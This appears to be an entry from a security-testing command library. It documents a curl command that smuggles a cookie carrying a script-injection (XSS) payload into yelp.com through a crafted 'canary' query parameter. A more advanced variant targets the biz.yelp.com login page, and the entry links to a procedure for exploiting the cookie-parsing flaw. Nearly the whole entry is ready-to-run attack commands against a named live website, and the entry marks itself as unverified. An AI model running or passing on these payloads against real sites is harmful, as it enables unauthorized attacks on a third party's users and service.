---
data: >-
  curl
  "https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E"
  -c cookies.txt -v
tags:
  - xss
  - cookie
type: command
output: >-
  Set-Cookie: yelpmainpaastacanary=asdf; Domain=.yelp.com; Path=/; Secure;
  SameSite=Lax

  * Smuggled guvo cookie set
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:34.340Z'
id: bde1699e-3fd1-430c-a8d5-dd368c29d15f
verified: false
validated: true
submitted: true
---
# Set Canary Cookie Smuggling

## Command

```bash
curl "https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E" -c cookies.txt -v
```

## Description

This command visits a crafted URL to trigger the Set-Cookie header for 'yelpmainpaastacanary', smuggling a 'guvo' XSS payload due to space-based parsing. Use to test basic smuggling on Yelp.com.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--canary` | Query param value with space-separated smuggling (URL-encoded) | Yes |
| `-c cookies.txt` | Save cookies to file | Yes |
| `-v` | Verbose output for headers | No |

## Examples

### Basic Usage

```bash
curl "https://www.yelp.com/?canary=asdf%20guvo%3Dtest" -c cookies.txt -v
```

### Advanced Usage

```bash
curl "https://biz.yelp.com/login?canary=asdf%20guvo%3D%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E" -c cookies.txt -v
```

## Expected Output

Verbose headers showing Set-Cookie with smuggled value; XSS alert on subsequent page load.

## Related

- [[commands/set-persistent-canary-cookie]]
- [[procedures/Exploit-Cookie-Parsing-Flaw-for-Payload-Smuggling]]
